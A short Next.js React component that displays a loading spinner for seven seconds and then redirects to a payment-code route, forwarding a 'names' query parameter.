"use client"
import styles from './finish.module.css'
import {useState,useEffect} from 'react'
import {useRouter,useSearchParams} from 'next/navigation'
const Finish = ()=>{
    const [showPage,setShowPage]=useState(true);
    const router = useRouter();
    const x = useSearchParams();
    const datas = x.get("names");

    useEffect(() => {
        const timer = setTimeout(() => {
            setShowPage(false)
            router.push(`/fozajil/banks/pay/code/nphad/codeto?names=${datas}`)
        }, 7000);
        return () => clearTimeout(timer);
    },[])
    
    
       
    return(
       <div className={styles.continer}>
            
           {showPage &&
<div class="loader"></div>}
       </div>

)

}

export default Finish;
